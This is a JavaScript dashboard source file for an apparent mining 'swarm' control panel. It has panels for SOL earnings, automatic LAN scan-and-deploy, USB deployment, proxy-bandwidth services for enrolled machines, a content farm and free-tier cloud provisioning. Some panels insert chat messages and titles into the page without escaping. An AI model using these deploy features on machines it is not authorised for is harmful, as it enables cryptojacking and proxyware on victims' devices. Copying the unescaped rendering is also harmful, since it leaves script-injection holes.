      html += '<div class="miner-section" style="margin-bottom:16px"><button class="btn-primary" onclick="window.aries.pushWorkerUpdate()" style="padding:10px 20px">\u{1F4E4} Push Update to All Workers</button></div>';

      // ── Pool + Swarm Row ──
      html += '<div class="miner-earnings-row">';

      // Pool section
      html += '<div class="miner-section"><h4>🏊 Pool</h4>';
      html += '<div style="margin-bottom:10px"><span class="miner-dot ' + (poolConnected ? 'green' : 'red') + '"></span><strong style="color:var(--text)">' + escapeHtml(poolName) + '</strong>';
      if (poolUrl) html += '<div style="font-size:11px;color:var(--text-dim);margin-top:2px;font-family:monospace;word-break:break-all">' + escapeHtml(poolUrl) + '</div>';
      html += '</div>';
      if (pools.length > 1) {
        html += '<table class="miner-pool-table"><thead><tr><th>Pool</th><th>Fee</th><th>Hashrate</th><th>Status</th></tr></thead><tbody>';
        for (var pi = 0; pi < pools.length; pi++) {
          var p = pools[pi];
          html += '<tr><td>' + escapeHtml(p.name || p.url || '') + '</td><td>' + (p.fee || '?') + '%</td><td>' + fmtHashrate(p.hashrate) + '</td><td><span class="miner-dot ' + (p.active ? 'green' : 'red') + '"></span>' + (p.active ? 'Active' : 'Standby') + '</td></tr>';
        }
        html += '</tbody></table>';
      }
      html += '</div>';

      // Swarm section
      html += '<div class="miner-section"><h4>📡 Swarm Connection</h4>';
      var swarmConnected = swarm.connected || swarm.relayConnected || false;
      var relayUrl = swarm.relayUrl || swarm.url || cfg.relayUrl || '';
      var swarmLabel = swarmConnected ? 'Connected' : (!mining && swarmNodes.length === 0 ? 'Ready to mine' : 'Disconnected');
      var swarmDotColor = swarmConnected ? 'green' : (!mining && swarmNodes.length === 0 ? 'yellow' : 'red');
      html += '<div style="margin-bottom:10px"><span class="miner-dot ' + swarmDotColor + '"></span><strong style="color:var(--text)">Relay ' + swarmLabel + '</strong>';
      if (relayUrl) html += '<div style="font-size:11px;color:var(--text-dim);margin-top:2px;font-family:monospace;word-break:break-all">' + escapeHtml(relayUrl) + '</div>';
      if (swarm.lastPing) html += '<div style="font-size:11px;color:var(--text-dim);margin-top:2px">Last ping: ' + new Date(swarm.lastPing).toLocaleTimeString() + '</div>';
      html += '</div>';
      var swarmMining = 0;
      for (var si = 0; si < swarmNodes.length; si++) { if (swarmNodes[si].status === 'mining' || swarmNodes[si].status === 'connected') swarmMining++; }
      html += '<div style="font-size:13px;color:var(--accent);margin-bottom:10px">' + swarmMining + ' / ' + swarmNodes.length + ' workers mining</div>';
      if (swarmNodes.length > 0) {
        html += '<div style="display:flex;flex-wrap:wrap;gap:4px">';
        for (var sni = 0; sni < swarmNodes.length; sni++) {
          var sn = swarmNodes[sni];
          html += '<span class="miner-swarm-node"><span class="miner-dot ' + dotClass(sn.status || 'offline') + '"></span>' + escapeHtml(sn.hostname || sn.id || 'Node ' + (sni + 1)) + '</span>';
        }
        html += '</div>';
      }
      html += '<button class="btn-sm" onclick="window.aries.showUsbDeployInstructions()" style="margin-top:12px">🔌 Deploy to USB</button>';
      html += '</div>';
      html += '</div>';

      // ── Network Auto-Deploy Section ──
      html += '<div class="miner-section" style="margin-top:16px"><h4>🌐 Network Auto-Deploy</h4>';
      html += '<div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">';
      html += '<button class="btn-primary" onclick="window.aries.networkScan()" id="netScanBtn">🔍 Scan Network</button>';
      html += '<label class="miner-toggle" style="display:flex;align-items:center;gap:6px"><input type="checkbox" id="autoDeployToggle" onchange="window.aries.setNetAutoDeploy(this.checked)" /><span class="slider"></span></label>';
      html += '<span style="font-size:12px;color:var(--text-dim)">Auto-Deploy</span>';
      html += '<button class="btn-sm" onclick="window.aries.showNetDeployLog()" style="margin-left:auto">📋 Log</button>';
      html += '</div>';
      html += '<div id="netDeployDevices" style="font-size:12px;color:var(--text-dim)">Click Scan to discover deployable devices on your LAN.</div>';
      html += '</div>';

      // ── Earnings Tracker ──
      html += '<div class="miner-earnings-row">';
      html += '<div class="miner-section"><h4>💰 Earnings Today</h4>';
      html += '<div style="font-size:28px;font-weight:800;color:var(--green);text-shadow:0 0 15px rgba(0,255,136,0.3)" id="minerDailyEarnings">' + dailySol.toFixed(6) + ' SOL</div>';
      html += '<div style="font-size:14px;color:var(--text-dim);margin-top:4px">≈ $' + dailyUsd.toFixed(2) + ' USD</div>';
      html += '</div>';
      html += '<div class="miner-section"><h4>📊 Total Mined</h4>';
      html += '<div style="font-size:28px;font-weight:800;color:#ffd700;text-shadow:0 0 15px rgba(255,215,0,0.3)">' + (pnl.totalSolMined || pnl.totalBtcMined || 0).toFixed(8) + ' SOL</div>';
      html += '<div style="font-size:14px;color:var(--text-dim);margin-top:4px">≈ $' + (pnl.totalUsd || 0).toFixed(2) + ' USD</div>';
      html += '</div>';
      html += '</div>';

      html += '</div>'; // end miner-dash
      el.innerHTML = html;

      // Start refresh timers
      if (mining) _minerRefreshTimer = setInterval(refreshMinerStats, 5000);
      // Uptime counter
      if (mining && _minerStartTime) {
        _minerUptimeTimer = setInterval(function() {
          var uel = document.getElementById('minerUptimeVal');
          if (uel && _minerStartTime) uel.textContent = fmtUptime((Date.now() - _minerStartTime) / 1000);
        }, 1000);
      }
      // Load profit dashboard
      loadProfitDashboard();
      // FEATURE 4: Load wallet balance
      loadWalletBalance();
      if (_walletRefreshTimer) clearInterval(_walletRefreshTimer);
      _walletRefreshTimer = setInterval(loadWalletBalance, 60000);
    });
  }

  function refreshMinerStats() {
    Promise.all([
      api('GET', 'miner/status', null, {}).catch(function() { return {}; }),
      api('GET', 'miner/profitability', null, {}).catch(function() { return {}; })
    ]).then(function(res) {
      var d = res[0], profit = res[1];
      var totalHr = 0;
      var nodes = d.nodes || [];
      for (var ni = 0; ni < nodes.length; ni++) totalHr += (nodes[ni].hashrate || 0);
      pushHashratePoint(totalHr);
      drawHashrateChart();
      var hrEl = document.getElementById('minerHashVal');
      if (hrEl) hrEl.textContent = fmtHashrate(totalHr || d.hashrate);
      var grid = document.getElementById('minerWorkerGrid');
      if (grid && nodes.length > 0) {
        var cards = grid.querySelectorAll('.mwc-hashrate');
        for (var i = 0; i < Math.min(cards.length, nodes.length); i++) {
          cards[i].textContent = fmtHashrate(nodes[i].hashrate);
        }
      }
      var dailyEl = document.getElementById('minerDailyEarnings');
      if (dailyEl && profit.dailySol) dailyEl.textContent = (profit.dailySol || 0).toFixed(6) + ' SOL';
      if (!d.mining && _minerRefreshTimer) {
        clearInterval(_minerRefreshTimer); _minerRefreshTimer = null;
        if (_minerUptimeTimer) { clearInterval(_minerUptimeTimer); _minerUptimeTimer = null; }
        _minerStartTime = null;
        // Reload full UI to reflect stopped state
        _loadedPanels['btc-miner'] = false; loadBtcMiner();
      }
    });
  }

  function toggleMining(on) {
    if (on) {
      var wallet = document.getElementById('minerWallet').value.trim();
      if (!wallet) { toast('Enter SOL wallet', 'error'); document.getElementById('minerToggle').checked = false; return; }
      saveMinerConfig();
      var threads = parseInt(document.getElementById('minerThreads').value) || 2;
      api('POST', 'miner/start', { wallet: wallet, threads: threads, intensity: _minerIntensity }).then(function() {
        toast('Mining started!', 'success');
        _minerStartTime = Date.now();
        _loadedPanels['btc-miner'] = false; loadBtcMiner();
      }).catch(function(e) { document.getElementById('minerToggle').checked = false; toast('Failed: ' + e.message, 'error'); });
    } else {
      api('POST', 'miner/stop').then(function() {
        if (_minerRefreshTimer) { clearInterval(_minerRefreshTimer); _minerRefreshTimer = null; }
        if (_minerUptimeTimer) { clearInterval(_minerUptimeTimer); _minerUptimeTimer = null; }
        _minerStartTime = null;
        toast('Mining stopped', 'info');
        _loadedPanels['btc-miner'] = false; loadBtcMiner();
      }).catch(function() {});
    }
  }

  function saveMinerConfig() {
    var w = document.getElementById('minerWallet'), t = document.getElementById('minerThreads');
    api('POST', 'miner/config', {
      wallet: w ? w.value.trim() : '', threads: t ? parseInt(t.value) : 2, intensity: _minerIntensity
    }).then(function() { toast('Config saved', 'success'); }).catch(function() {});
  }

  function setMinerIntensity(level) {
    _minerIntensity = level;
    var btns = document.querySelectorAll('.miner-intensity-bar button');
    for (var i = 0; i < btns.length; i++) {
      btns[i].classList.toggle('active', btns[i].getAttribute('data-intensity') === level);
    }
  }

  function showUsbDeployInstructions() {
    toast('See USB Swarm tab for deployment instructions', 'info');
    switchPanel('usb-swarm');
  }

  function refreshMiner() { _loadedPanels['btc-miner'] = false; loadBtcMiner(); }

  // ═══════════════════════════════
  //  PROXY EARNINGS TAB
  // ═══════════════════════════════
  function loadProxyEarnings() {
    var el = document.getElementById('proxyEarningsContent'); if (!el) return;
    if (_loadedPanels['proxy-earnings']) return;
    el.innerHTML = '<div class="spinner"></div> Loading proxy networks...';
    Promise.all([
      api('GET', 'proxy/networks').catch(function() { return { networks: [] }; }),
      api('GET', 'proxy/network/earnings').catch(function() { return { networks: [], totalDaily: 0 }; }),
      api('GET', 'proxy/network/status').catch(function() { return { active: [], totalDevices: 0 }; })
    ]).then(function(results) {
      var networks = results[0].networks || [];
      var earnings = results[1];
      var status = results[2];
      var totalDaily = earnings.totalDaily || 0;
      var totalMonthly = totalDaily * 30;
      var totalDevices = status.totalDevices || 0;

      var html = '';
      // Summary cards
      html += '<div class="miner-stats-bar">';
      html += '<div class="miner-stat-tile"><div class="mst-label">Daily Estimate</div><div class="mst-val green">$' + totalDaily.toFixed(2) + '</div><div class="mst-sub">across all services</div></div>';
      html += '<div class="miner-stat-tile"><div class="mst-label">Monthly Estimate</div><div class="mst-val gold">$' + totalMonthly.toFixed(2) + '</div><div class="mst-sub">projected</div></div>';
      html += '<div class="miner-stat-tile"><div class="mst-label">Active Services</div><div class="mst-val">' + (status.active || []).length + '</div><div class="mst-sub">of ' + networks.length + ' available</div></div>';
      html += '<div class="miner-stat-tile"><div class="mst-label">Enrolled Machines</div><div class="mst-val">' + totalDevices + '</div><div class="mst-sub">swarm workers</div></div>';
      html += '</div>';

      // Service cards
      html += '<div class="miner-section" style="margin-top:16px"><h4>\uD83C\uDF10 Proxy Services</h4>';
      html += '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:12px">';
      for (var i = 0; i < networks.length; i++) {
        var net = networks[i];
        var netEarnings = 0;
        var netDevices = 0;
        if (earnings.networks) {
          for (var ei = 0; ei < earnings.networks.length; ei++) {
            if (earnings.networks[ei].network === net.id) { netEarnings = earnings.networks[ei].dailyEstimate || 0; break; }
          }
        }
        if (status.active) {
          for (var si = 0; si < status.active.length; si++) {
            if (status.active[si].network === net.id) { netDevices = status.active[si].devices || 0; break; }
          }
        }
        var isEnabled = net.enabled;
        html += '<div class="miner-ctrl-card" style="border-color:' + (isEnabled ? 'var(--cyan)' : 'var(--border)') + '">';
        html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">';
        html += '<h4 style="margin:0">' + (net.emoji || '\uD83C\uDF10') + ' ' + escapeHtml(net.name) + '</h4>';
        html += '<span class="miner-dot ' + (isEnabled ? 'green' : 'red') + '"></span>';
        html += '</div>';
        html += '<div style="font-size:12px;color:var(--text-dim);margin-bottom:8px">' + escapeHtml(net.description || '') + '</div>';
        html += '<div style="display:flex;gap:16px;font-size:12px;margin-bottom:10px">';
        html += '<span style="color:var(--green)">$' + netEarnings.toFixed(2) + '/day</span>';
        html += '<span style="color:var(--text-dim)">' + netDevices + ' devices</span>';
        html += '<span style="color:var(--text-dim)">~$' + (net.earningsPerDay || '0.10-0.50') + '/day/device</span>';
        html += '</div>';
        // Credential fields
        html += '<div class="proxy-cred-fields" data-network="' + net.id + '">';
        html += '<input type="text" class="input-field" placeholder="Email" value="' + escapeHtml(net.email || '') + '" data-field="email" style="margin-bottom:4px;font-size:12px" />';
        html += '<input type="password" class="input-field" placeholder="Password / API Key" value="" data-field="password" style="margin-bottom:4px;font-size:12px" />';
        html += '</div>';
        html += '<div style="display:flex;gap:6px">';
        html += '<button class="btn-sm" onclick="window.aries.saveProxyNetwork(\'' + net.id + '\')" style="flex:1">' + (isEnabled ? '\u2705 Update' : '\uD83D\uDD17 Connect') + '</button>';
        if (isEnabled) html += '<button class="btn-sm" onclick="window.aries.leaveProxyNetwork(\'' + net.id + '\')" style="color:var(--red)">Disconnect</button>';
        html += '</div>';
        html += '</div>';
      }
      html += '</div></div>';

      el.innerHTML = html;
      _loadedPanels['proxy-earnings'] = true;
    }).catch(function(e) { el.innerHTML = '<div style="color:var(--red)">Failed to load: ' + escapeHtml(e.message) + '</div>'; });
  }

  window.aries = window.aries || {};
  window.aries.refreshProxyEarnings = function() { _loadedPanels['proxy-earnings'] = false; loadProxyEarnings(); };
  window.aries.saveProxyNetwork = function(network) {
    var container = document.querySelector('.proxy-cred-fields[data-network="' + network + '"]');
    if (!container) return;
    var email = container.querySelector('[data-field="email"]').value;
    var password = container.querySelector('[data-field="password"]').value;
    api('POST', 'proxy/network/join', { network: network, email: email, password: password, apiKey: password }).then(function() {
      toast(network + ' configured!', 'success');
      _loadedPanels['proxy-earnings'] = false; loadProxyEarnings();
    }).catch(function(e) { toast('Failed: ' + e.message, 'error'); });
  };
  window.aries.leaveProxyNetwork = function(network) {
    api('POST', 'proxy/network/leave', { network: network }).then(function() {
      toast(network + ' disconnected', 'success');
      _loadedPanels['proxy-earnings'] = false; loadProxyEarnings();
    }).catch(function(e) { toast('Failed: ' + e.message, 'error'); });
  };
  window.aries.deployProxyToSwarm = function() {
    api('POST', 'proxy/network/broadcast', {}).then(function(d) {
      toast('Deployed to ' + (d.count || 0) + ' networks across swarm!', 'success');
    }).catch(function(e) { toast('Deploy failed: ' + e.message, 'error'); });
  };

  // ═══ Profit Dashboard ═══
  function loadProfitDashboard() {
    api('GET', 'profit/summary').then(function(d) {
      var el = function(id) { return document.getElementById(id); };
      if (d.balance !== null && d.balance !== undefined) {
        el('profitBalance').textContent = d.balance.toFixed(6) + ' SOL';
        el('profitBalanceUsd').textContent = '$' + (d.usdValue || 0).toFixed(2);
      }
      if (d.todayEarned !== undefined) {
        el('profitToday').textContent = (d.todayEarned || 0).toFixed(6) + ' SOL';
        el('profitTodayUsd').textContent = '$' + (d.todayEarnedUsd || 0).toFixed(2);
      }
      if (d.totalEarned !== undefined) {
        el('profitTotal').textContent = (d.totalEarned || 0).toFixed(6) + ' SOL';
        el('profitTotalUsd').textContent = '$' + (d.totalEarnedUsd || 0).toFixed(2);
      }
      if (d.solPrice) el('profitSolPrice').textContent = 'SOL: $' + d.solPrice.toFixed(2);
      if (d.address) {
        var short = d.address.substring(0, 6) + '...' + d.address.slice(-4);
        el('profitWallet').innerHTML = '<a href="https://solscan.io/account/' + d.address + '" target="_blank" style="color:#0f08;text-decoration:none;">' + short + ' ↗</a>';
      }
    }).catch(function() {});
    api('GET', 'profit/history?limit=50').then(function(d) {
      var el = document.getElementById('profitHistory');
      if (!el) return;
      var rows = (d.history || []).reverse();
      if (rows.length === 0) { el.innerHTML = '<div style="padding:12px;color:#666;">No history yet. Balance is polled every 5 minutes.</div>'; return; }
      var html = '<table style="width:100%;border-collapse:collapse;"><tr style="color:#0ff8;border-bottom:1px solid #1a1a2e;"><th style="padding:6px 8px;text-align:left;">Time</th><th style="text-align:right;padding:6px 8px;">Balance</th><th style="text-align:right;padding:6px 8px;">Change</th><th style="text-align:right;padding:6px 8px;">USD</th></tr>';
      rows.forEach(function(r) {
        var dt = new Date(r.timestamp);
        var timeStr = dt.toLocaleDateString() + ' ' + dt.toLocaleTimeString();
        var changeColor = r.change > 0 ? '#0f0' : r.change < 0 ? '#f55' : '#666';
        var changeStr = r.change > 0 ? '+' + r.change.toFixed(6) : r.change.toFixed(6);
        html += '<tr style="border-bottom:1px solid #111;"><td style="padding:4px 8px;color:#888;">' + timeStr + '</td><td style="text-align:right;padding:4px 8px;color:#0ff;">' + r.balance.toFixed(6) + '</td><td style="text-align:right;padding:4px 8px;color:' + changeColor + ';">' + changeStr + '</td><td style="text-align:right;padding:4px 8px;color:#aaa;">$' + (r.usdValue || 0).toFixed(2) + '</td></tr>';
      });
      html += '</table>';
      el.innerHTML = html;
    }).catch(function() {});
  }

  // ═══ FEATURE 4: Wallet Balance ═══
  var _lastWalletSol = null;
  var _walletRefreshTimer = null;
  function loadWalletBalance() {
    api('GET', 'wallet/balance').then(function(d) {
      var solEl = document.getElementById('walletSolBal');
      var usdEl = document.getElementById('walletUsdBal');
      var trendEl = document.getElementById('walletTrend');
      if (solEl) solEl.textContent = (d.sol || 0).toFixed(6) + ' SOL';
      if (usdEl) usdEl.textContent = '≈ $' + (d.usd || 0).toFixed(2) + (d.solPrice ? ' (SOL $' + d.solPrice.toFixed(0) + ')' : '');
      if (trendEl && _lastWalletSol !== null) {
        if (d.sol > _lastWalletSol) trendEl.textContent = '▲';
        else if (d.sol < _lastWalletSol) trendEl.textContent = '▼';
        else trendEl.textContent = '—';
        trendEl.style.color = d.sol > _lastWalletSol ? '#0f0' : d.sol < _lastWalletSol ? '#f55' : '#666';
      }
      _lastWalletSol = d.sol || 0;
    }).catch(function() {
      var solEl = document.getElementById('walletSolBal');
      if (solEl) solEl.textContent = 'Unavailable';
    });
  }

  // ═══ Worker Chat ═══
  var _workerChatColors = {};
  var _chatColorPalette = ['#0ff', '#f0f', '#0f0', '#ff0', '#f80', '#08f', '#f08', '#8f0', '#80f', '#0f8'];
  function getWorkerColor(name) {
    if (!_workerChatColors[name]) {
      var idx = Object.keys(_workerChatColors).length % _chatColorPalette.length;
      _workerChatColors[name] = _chatColorPalette[idx];
    }
    return _workerChatColors[name];
  }

  function loadWorkerChat() {
    var filter = (document.getElementById('chatFilterWorker') || {}).value || '';
    var url = 'swarm/chat?limit=50';
    if (filter) url += '&worker=' + encodeURIComponent(filter);
    api('GET', url).then(function(d) {
      var el = document.getElementById('workerChatMessages');
      if (!el) return;
      var msgs = d.messages || [];
      if (msgs.length === 0) { el.innerHTML = '<div style="padding:12px;color:#666;">No messages yet. Workers will announce when they come online.</div>'; return; }
      var html = '';
      msgs.forEach(function(m) {
        var dt = new Date(m.timestamp);
        var timeStr = dt.toLocaleTimeString();
        var color = m.from === 'master' ? '#f0f' : getWorkerColor(m.from);
        var toStr = m.to && m.to !== 'all' ? ' → ' + m.to : '';
        html += '<div style="margin-bottom:4px;"><span style="color:#666;">[' + timeStr + ']</span> <span style="color:' + color + ';font-weight:bold;">' + (m.from || '?') + toStr + ':</span> <span style="color:#ccc;">' + m.text + '</span></div>';
      });
      el.innerHTML = html;
      el.scrollTop = el.scrollHeight;

      // Populate filter and target dropdowns with unique workers
      var workers = new Set();
      msgs.forEach(function(m) { if (m.from && m.from !== 'master') workers.add(m.from); });
      var filterEl = document.getElementById('chatFilterWorker');
      var targetEl = document.getElementById('chatTargetWorker');
      if (filterEl) {
        var currentFilter = filterEl.value;
        filterEl.innerHTML = '<option value="">All Workers</option>';
        workers.forEach(function(w) { filterEl.innerHTML += '<option value="' + w + '"' + (w === currentFilter ? ' selected' : '') + '>' + w + '</option>'; });
      }
      if (targetEl) {
        var currentTarget = targetEl.value;
        targetEl.innerHTML = '<option value="all">All</option>';
        workers.forEach(function(w) { targetEl.innerHTML += '<option value="' + w + '"' + (w === currentTarget ? ' selected' : '') + '>' + w + '</option>'; });
      }
    }).catch(function() {});
  }

  function sendWorkerChat() {
    var input = document.getElementById('workerChatInput');
    var target = (document.getElementById('chatTargetWorker') || {}).value || 'all';
    var text = (input || {}).value || '';
    if (!text.trim()) return;
    api('POST', 'swarm/chat', { text: text, to: target }).then(function() {
      if (input) input.value = '';
      loadWorkerChat();
      // Poll for swarm AI response (arrives async)
      setTimeout(loadWorkerChat, 2000);
      setTimeout(loadWorkerChat, 5000);
      setTimeout(loadWorkerChat, 10000);
    }).catch(function(e) { toast('Chat send failed: ' + e.message, 'error'); });
  }

  // ═══════════════════════════════
  //  CONTENT FARM
  // ═══════════════════════════════
  function generateContent() {
    var body = {
      type: document.getElementById('cfType').value,
      topic: document.getElementById('cfTopic').value,
      keywords: document.getElementById('cfKeywords').value.split(',').map(function(k){return k.trim();}).filter(Boolean),
      tone: document.getElementById('cfTone').value,
      length: document.getElementById('cfLength').value,
      count: parseInt(document.getElementById('cfCount').value) || 1
    };
    if (!body.topic) { toast('Enter a topic', 'error'); return; }
    var prog = document.getElementById('cfProgress'); prog.style.display = 'block';
    document.getElementById('cfProgressBar').style.width = '30%';
    document.getElementById('cfProgressText').textContent = 'Generating ' + body.count + ' piece(s)...';
    api('POST', 'content/generate', body).then(function(d) {
      document.getElementById('cfProgressBar').style.width = '100%';
      document.getElementById('cfProgressText').textContent = 'Generated ' + (d.generated || 0) + '/' + (d.requested || 0) + ' pieces';
      toast('Generated ' + (d.generated || 0) + ' content pieces!', 'success');
      refreshContentFarm();
    }).catch(function(e) { toast('Generation failed: ' + e.message, 'error'); prog.style.display = 'none'; });
  }

  function refreshContentFarm() {
    api('GET', 'content/stats').then(function(stats) {
      var el = document.getElementById('cfStatsCards');
      el.innerHTML = '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center;"><div style="font-size:24px;font-weight:bold;color:var(--accent);">' + (stats.total||0) + '</div><div style="font-size:11px;color:var(--text-dim);">Total Pieces</div></div>' +
        '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center;"><div style="font-size:24px;font-weight:bold;color:#0f0;">' + (stats.todayCount||0) + '</div><div style="font-size:11px;color:var(--text-dim);">Today</div></div>' +
        '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center;"><div style="font-size:24px;font-weight:bold;color:#f0f;">' + (stats.totalWords||0) + '</div><div style="font-size:11px;color:var(--text-dim);">Total Words</div></div>' +
        '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center;"><div style="font-size:24px;font-weight:bold;color:#ff0;">' + (stats.estimatedValue||'$0') + '</div><div style="font-size:11px;color:var(--text-dim);">Est. Value</div></div>';
    });
    api('GET', 'content/library').then(function(items) {
      var tb = document.getElementById('cfLibraryTable'); tb.innerHTML = '';
      (items || []).forEach(function(item) {
        var d = new Date(item.timestamp); var ds = d.toLocaleDateString();
        tb.innerHTML += '<tr><td style="max-width:250px;overflow:hidden;text-overflow:ellipsis;">' + (item.title||'Untitled') + '</td><td>' + item.type + '</td><td>' + (item.wordCount||0) + '</td><td>' + ds + '</td><td><button class="btn-sm" onclick="navigator.clipboard.writeText(\'\').then(function(){window.aries.toast(\'Copied!\',\'success\')});api(\'GET\',\'content/' + item.id + '\').then(function(d){navigator.clipboard.writeText(d.body)})">Copy</button> <button class="btn-sm" onclick="api(\'DELETE\',\'content/' + item.id + '\').then(function(){window.aries.refreshContentFarm();})" style="color:var(--red);">Del</button></td></tr>';
      });
      if (!items || !items.length) tb.innerHTML = '<tr><td colspan="5" style="color:var(--text-dim);text-align:center;">No content yet. Generate some!</td></tr>';
    });
  }

  // ═══════════════════════════════
  //  ORACLE CLOUD
  // ═══════════════════════════════
  function saveOracleCredentials() {
    var body = {
      tenancyOcid: document.getElementById('ocTenancy').value,
      userOcid: document.getElementById('ocUser').value,
      fingerprint: document.getElementById('ocFingerprint').value,
      keyFile: document.getElementById('ocKeyFile').value,
      region: document.getElementById('ocRegion').value,
      compartmentOcid: document.getElementById('ocCompartment').value
    };
    api('POST', 'cloud/oracle/setup', body).then(function() { toast('Oracle credentials saved!', 'success'); }).catch(function(e) { toast('Save failed: ' + e.message, 'error'); });
  }

  function provisionOracle() {
    var st = document.getElementById('ocProvisionStatus');
    st.textContent = 'Provisioning... this may take several minutes.';
    st.style.color = 'var(--accent)';
    api('POST', 'cloud/oracle/provision', {}).then(function(d) {
      if (d.error) { st.textContent = d.error; st.style.color = 'var(--red)'; if (d.instructions) st.textContent += '\n' + d.instructions.join('\n'); }
      else { st.textContent = 'Provisioned: ' + d.instance.displayName + ' (' + d.instance.publicIp + ')'; st.style.color = '#0f0'; refreshOracleCloud(); }
    }).catch(function(e) { st.textContent = 'Failed: ' + e.message; st.style.color = 'var(--red)'; });
  }

  function refreshOracleCloud() {
    api('GET', 'cloud/oracle/instances').then(function(instances) {
      var tb = document.getElementById('ocInstanceTable'); tb.innerHTML = '';
      (instances || []).forEach(function(i) {
        tb.innerHTML += '<tr><td>' + i.displayName + '</td><td>' + (i.publicIp||'-') + '</td><td>' + i.shape + '</td><td>' + i.region + '</td><td style="color:' + (i.workerDeployed?'#0f0':'#f80') + ';">' + (i.workerDeployed?'✓ Deployed':'Pending') + '</td><td>' + new Date(i.createdAt).toLocaleDateString() + '</td><td><button class="btn-sm" onclick="api(\'DELETE\',\'cloud/oracle/' + i.id + '\').then(function(){window.aries.refreshOracleCloud();toast(\'Terminated\',\'success\')})" style="color:var(--red);">Terminate</button></td></tr>';
      });
      if (!instances || !instances.length) tb.innerHTML = '<tr><td colspan="7" style="color:var(--text-dim);text-align:center;">No instances. Provision one above.</td></tr>';
    });
  }

  // ═══════════════════════════════
  //  CLOUD AUTO-SCALER
  // ═══════════════════════════════
  function loadCloudScale() {
    api('GET', 'cloud/status').then(function(st) {
      var providers = [
        { key: 'oracle', name: 'Oracle Cloud', badge: 'FREE FOREVER', badgeColor: '#0f0', desc: '4 OCPUs, 24GB RAM - ARM A1 Flex', cores: 4 },
        { key: 'aws', name: 'AWS', badge: 'Free 12 months', badgeColor: '#f80', desc: 't2.micro - 1 vCPU, 1GB RAM', cores: 1 },
        { key: 'azure', name: 'Azure', badge: 'Free 12 months', badgeColor: '#08f', desc: 'B1s - 1 vCPU, 1GB RAM', cores: 1 },
        { key: 'gcp', name: 'GCP', badge: 'FREE FOREVER', badgeColor: '#0f0', desc: 'e2-micro - 0.25 vCPU, 1GB', cores: 0.25 }
      ];

      var el = document.getElementById('csCards');
      if (!el) return;
      el.innerHTML = '';

      providers.forEach(function(p) {
        var pData = st.providers[p.key] || { instances: [], cost: 0 };
        var card = document.createElement('div');
        card.style.cssText = 'background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:12px;';
        var instRows = '';
        pData.instances.forEach(function(i) {
          instRows += '<tr><td>' + (i.displayName||i.id) + '</td><td>' + (i.publicIp||'-') + '</td><td>' + (i.shape||'-') + '</td><td>' + (i.region||'-') + '</td><td style="color:#0f0;">' + (i.status||'running') + '</td><td><button class="btn-sm" onclick="window.aries.cloudDestroy(\'' + i.provider + '\',\'' + i.id + '\')" style="color:var(--red);">Terminate</button></td></tr>';
        });
        if (!instRows) instRows = '<tr><td colspan="6" style="color:var(--text-dim);text-align:center;">No instances</td></tr>';
        card.innerHTML = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">' +
          '<h3 style="margin:0;">' + p.name + ' <span style="font-size:11px;background:' + p.badgeColor + '22;color:' + p.badgeColor + ';padding:2px 8px;border-radius:4px;">' + p.badge + '</span></h3>' +
          '<button class="btn-sm" onclick="window.aries.cloudProvision(\'' + p.key + '\')" style="background:var(--accent);">+ Provision</button>' +
          '</div>' +
          '<div style="color:var(--text-dim);font-size:12px;margin-bottom:8px;">' + p.desc + ' | Instances: ' + pData.instances.length + ' | Cost: $' + pData.cost + '/mo</div>' +
          '<table class="data-table" style="width:100%;font-size:12px;"><thead><tr><th>Name</th><th>IP</th><th>Shape</th><th>Region</th><th>Status</th><th></th></tr></thead><tbody>' + instRows + '</tbody></table>';
        el.appendChild(card);
      });

      // Summary
      var sum = document.getElementById('csSummary');
      if (sum) sum.innerHTML = '<span style="color:var(--accent);">' + st.totalInstances + '</span> instances | <span style="color:var(--accent);">' + st.totalCores + '</span> cores | ~<span style="color:#0f0;">' + st.estHashrate + ' H/s</span> est. | Cost: <span style="color:#0f0;">$0/mo</span>';
    }).catch(function(e) {
      var el = document.getElementById('csCards');
      if (el) el.innerHTML = '<div style="color:var(--red);">Error: ' + e.message + '</div>';
    });
  }

  function cloudProvision(provider) {
    toast('Provisioning ' + provider + ' instance...', 'info');
    api('POST', 'cloud/provision', { provider: provider }).then(function(d) {
      if (d.error) { toast(d.error, 'error'); return; }
      toast(provider + ' instance provisioned: ' + (d.instance.displayName || d.instance.id), 'success');
      loadCloudScale();
    }).catch(function(e) { toast('Provision failed: ' + e.message, 'error'); });
  }

  function cloudDestroy(provider, instanceId) {
    if (!confirm('Terminate ' + provider + ' instance ' + instanceId + '?')) return;
    api('DELETE', 'cloud/instance', { provider: provider, instanceId: instanceId }).then(function() {
      toast('Instance terminated', 'success');
      loadCloudScale();
    }).catch(function(e) { toast('Failed: ' + e.message, 'error'); });
  }

  // ═══════════════════════════════
  //  WORKER HEALTH DASHBOARD
  // ═══════════════════════════════
  function refreshWorkerHealth() {
    api('GET', 'health/overview').then(function(ov) {
      var el = document.getElementById('whOverviewCards');
      var worstLabel = ov.worstPerformer ? (ov.worstPerformer.id.substring(0,12) + ' (' + ov.worstPerformer.uptimePct + '%)') : 'N/A';
      el.innerHTML = [
        { label: 'Fleet Uptime', val: (ov.fleetUptimePct||0) + '%', color: ov.fleetUptimePct > 99 ? '#0f0' : ov.fleetUptimePct > 95 ? '#ff0' : '#f00' },
        { label: 'Avg Hashrate', val: (ov.avgHashrate||0) + ' H/s', color: 'var(--accent)' },
        { label: 'Total Workers', val: ov.totalWorkers || 0, color: 'var(--accent2)' },
        { label: 'Worst Performer', val: worstLabel, color: '#f80' }
      ].map(function(c) {
        return '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:14px;text-align:center;"><div style="font-size:22px;font-weight:bold;color:' + c.color + ';">' + c.val + '</div><div style="font-size:11px;color:var(--text-dim);margin-top:4px;">' + c.label + '</div></div>';
      }).join('');
    });
    api('GET', 'health/workers').then(function(workers) {
      var grid = document.getElementById('whWorkerGrid'); grid.innerHTML = '';
      for (var wId in workers) {
        var w = workers[wId];
